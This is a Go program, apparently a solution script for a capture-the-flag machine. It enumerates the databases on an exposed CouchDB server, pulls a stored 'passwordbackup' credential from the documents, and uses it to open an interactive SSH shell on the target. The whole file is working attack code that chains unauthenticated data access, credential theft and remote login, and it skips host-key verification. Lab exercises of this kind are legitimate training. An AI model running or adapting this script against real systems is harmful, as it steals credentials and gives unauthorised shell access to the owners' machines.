package main

//============================================================
//
// Author: Thomas Osgood
//
// Description:
//
//  This program is designed to contact a "couchdb" target,
//  discovered credentials saved within one of the databases,
//  then use those credentials to open up an SSH connection
//  with the target machine.
//
//  After the SSH connection is established, the attacker can
//  view the user flag and begin privilege escalation.
//
//============================================================

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type AllDocs struct {
	Rows []Doc `json:"rows"`
}

type Doc struct {
	Id string `json:"id"`
}

type TargetEntry struct {
	Creds string `json:"passwordbackup"`
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

// ============================================================
//
// Function Name: ParseCreds
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

// ============================================================
//
// Function Name: ParseCreds
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to contact the target machine and pull
//  down all databases of interest.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  targetdbs - []string. list of target databases.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GrabDBs() (targetdbs []string, success bool, message string) {
	var currentdb string
	var jsonarray []string
	var route string = "_all_dbs"

	SysMsgNB("grabbing all databases")

	bodycontent, err := c.GetBodyContent(route)
	if err != nil {
		return nil, false, err.Error()
	}

	err = json.Unmarshal(bodycontent, &jsonarray)
	if err != nil {
		return nil, false, err.Error()
	}

	SysMsgNB("parsing target databases")
	for i := range jsonarray {
		currentdb = jsonarray[i]
		if currentdb[0] == '_' {
			continue
		} else if strings.Contains(currentdb, "test_") {
			continue
		} else {
			targetdbs = append(targetdbs, currentdb)
		}
	}

	return targetdbs, true, "target databases grabbed"
}

// ============================================================
//
// Function Name: CheckDB
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to check a specified database for the
//  presence of user credentials.
//
// Input(s):
//
//  database - string. database to check.
//
// Return(s):
//
//  credentials - string. credentails pulled from database.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) CheckDB(database string) (credentials string, success bool, message string) {
	var docs []Doc
	var lmessage string
	var lsuccess bool

	SysMsgNB(fmt.Sprintf("checking \"%s\" for credentials", database))

	docs, success, message = c.GrabDocs(database)
	if !success {
		return "", false, message
	}

	for i := range docs {
		credentials, lsuccess, lmessage = c.CheckDoc(database, docs[i])
		if lsuccess {
			SucMsg(lmessage)
			break
		}
	}

	if len(credentials) < 1 {
		return "", false, fmt.Sprintf("no credentials discovered in \"%s\"", database)
	}

	return credentials, true, fmt.Sprintf("credentials discovered in \"%s\"", database)
}

// ============================================================
//
// Function Name: CheckDoc
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to check a given database row for the
//  presence of credentials.
//
// Input(s):
//
//  database - string. database to check in.
//  doc - Doc. row to check.
//
// Return(s):
//
//  credentials - string. credentials discovered in row.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) CheckDoc(database string, doc Doc) (credentials string, success bool, message string) {
	var route string = fmt.Sprintf("%s/%s", database, doc.Id)
	var bodycontent []byte
	var credentialrow TargetEntry

	bodycontent, err := c.GetBodyContent(route)
	if err != nil {
		return "", false, err.Error()
	}

	err = json.Unmarshal(bodycontent, &credentialrow)
	if err != nil {
		return "", false, err.Error()
	}

	credentials = credentialrow.Creds

	if len(credentials) < 1 {
		return "", false, "no credentials found"
	}

	return credentials, true, fmt.Sprintf("credentials discovered: \"%s\"", credentials)
}

// ============================================================
//
// Function Name: GrabDocs
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to contact the target and get all the
//  row ids in specified database.
//
// Input(s):
//
//  database - string. database to get rows from.
//
// Return(s):
//
//  docs - []Doc. rows pulled from the given database.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GrabDocs(database string) (docs []Doc, success bool, message string) {
	var alldocs AllDocs
	var route string = fmt.Sprintf("%s/_all_docs", database)

	bodycontent, err := c.GetBodyContent(route)
	if err != nil {
		return nil, false, err.Error()
	}

	err = json.Unmarshal(bodycontent, &alldocs)
	if err != nil {
		return nil, false, err.Error()
	}

	docs = alldocs.Rows

	if len(docs) < 1 {
		return nil, false, fmt.Sprintf("no docs found in \"%s\"", database)
	}

	return docs, true, "docs grabbed"
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: ParseCreds
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take credentials that are formatted
//  in the form "username:password" and return the username
//  and password to the user.
//
// Input(s):
//
//  credentials - string. credentials to parse.
//
// Return(s):
//
//  username - string. username pulled from creds.
//  password - string. password pulled from creds.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func ParseCreds(credentials string) (username string, password string, success bool, message string) {
	var splitcreds []string
	splitcreds = strings.Split(credentials, ":")

	username = splitcreds[0]
	password = splitcreds[1]

	return username, password, true, "credentials successfully parsed"
}

// ============================================================
//
// Function Name: SSHConnection
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to initialize an SSH
//	connection with the target machine using specified creds.
//
// Input(s):
//
//	targetIP - string. IP address of target.
//
// Return(s):
//
//	success - bool. indication of successful SSH attempt.
//	message - string. status message.
//
// ============================================================
func SSHConnection(targetIP string, sshusername string, sshpassword string) (success bool, message string) {
	success = true
	message = "SSH connection successful"

	PrintChar('=', 60)
	InfMsgNB("Initializing SSH Connection\n")
	PrintChar('=', 60)
	fmt.Printf("\n")

	sshconfig := &ssh.ClientConfig{
		User:            sshusername,
		Auth:            []ssh.AuthMethod{ssh.Password(sshpassword)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Minute,
	}

	connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", targetIP), sshconfig)
	if err != nil {
		return false, err.Error()
	}
	defer connection.Close()

	session, err := connection.NewSession()
	if err != nil {
		return false, fmt.Sprintf("Unable to create SSH session: %s", err.Error())
	}
	defer session.Close()

	modes := ssh.TerminalModes{
		ssh.ECHO:          1,
		ssh.TTY_OP_ISPEED: 14400,
		ssh.TTY_OP_OSPEED: 14400,
	}

	session.Stdin = os.Stdin
	session.Stderr = os.Stderr
	session.Stdout = os.Stdout

	// Create stable shell
	filedescriptor := int(os.Stdin.Fd())
	if terminal.IsTerminal(filedescriptor) {
		originalstate, err := terminal.MakeRaw(filedescriptor)
		if err != nil {
			ErrMsg(err.Error())
		}
		defer terminal.Restore(filedescriptor, originalstate)

		tw, th, err := terminal.GetSize(filedescriptor)
		if err != nil {
			ErrMsg(err.Error())
		}

		if err := session.RequestPty("xterm-256color", tw, th, modes); err != nil {
			return false, fmt.Sprintf("request for pseudo terminal failed: %s", err.Error())
		}
	}

	err = session.Shell()
	if err != nil {
		return false, err.Error()
	}
	session.Wait()

	fmt.Printf("\n")
	PrintChar('=', 60)
	InfMsgNB(fmt.Sprintf("SSH Connection Closed\n%s", ANSI_CLRLN))
	PrintChar('=', 60)
	fmt.Printf("\n")

	return success, message
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	var message string
	var success bool

	var credentials string
	var targetdbs []string

	var username string
	var password string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 5984, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message = ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Pull down all relevant database names from the target.
	//============================================================
	targetdbs, success, message = client.GrabDBs()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Check each target db for creds until they are found.
	//
	// If creds are found, the loop is exited and no the search
	// is stopped.
	//============================================================
	for i := range targetdbs {
		credentials, success, message = client.CheckDB(targetdbs[i])
		if !success {
			ErrMsg(message)
		} else {
			SucMsg(message)
			break
		}
	}

	//============================================================
	// If the length of "credentials" is less than 1, no creds
	// have been found.
	//============================================================
	if len(credentials) < 1 {
		ErrMsg("no credentials discovered")
		os.Exit(1)
	}

	//============================================================
	// Pull the username and password form the credential string.
	//============================================================
	username, password, success, message = ParseCreds(credentials)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Open up an SSH connection with the target machine using
	// the credentials pulled from the database.
	//============================================================
	success, message = SSHConnection(domain, username, password)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

